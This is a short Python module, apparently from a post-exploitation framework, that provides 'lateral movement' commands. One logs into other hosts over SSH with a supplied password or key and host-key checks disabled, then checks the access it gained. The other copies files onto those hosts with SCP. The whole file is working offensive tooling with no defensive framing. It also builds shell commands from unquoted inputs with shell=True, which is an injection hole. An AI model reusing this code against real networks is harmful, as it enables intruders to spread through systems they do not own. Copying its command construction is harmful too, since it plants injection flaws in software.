"""Lateral movement module."""

import os
import subprocess

NAME = "lateral"


def _run(cmd: str, timeout: int = 30) -> str:
    try:
        return subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, timeout=timeout).decode(errors="replace").strip()
    except subprocess.CalledProcessError as e:
        return e.output.decode(errors="replace").strip() if e.output else str(e)
    except Exception as e:
        return str(e)


def cmd_lateral_ssh(host: str, user: str, credential: str) -> dict:
    if os.path.isfile(credential):
        cmd = f"ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -i {credential} {user}@{host} 'id && hostname'"
    else:
        cmd = f"sshpass -p '{credential}' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null {user}@{host} 'id && hostname'"

    output = _run(cmd, timeout=15)
    success = "uid=" in output
    return {
        "status": "success" if success else "error",
        "host": host, "user": user,
        "output": output,
    }


def cmd_lateral_scp(src: str, host: str, dst: str, user: str, credential: str) -> dict:
    if os.path.isfile(credential):
        cmd = f"scp -o StrictHostKeyChecking=no -i {credential} {src} {user}@{host}:{dst}"
    else:
        cmd = f"sshpass -p '{credential}' scp -o StrictHostKeyChecking=no {src} {user}@{host}:{dst}"

    output = _run(cmd, timeout=60)
    return {
        "status": "success" if not output else "done",
        "host": host, "src": src, "dst": dst,
        "output": output,
    }


COMMANDS = {
    "lateral_ssh": {"handler": cmd_lateral_ssh, "description": "Lateral move via SSH"},
    "lateral_scp": {"handler": cmd_lateral_scp, "description": "Copy files via SCP"},
}
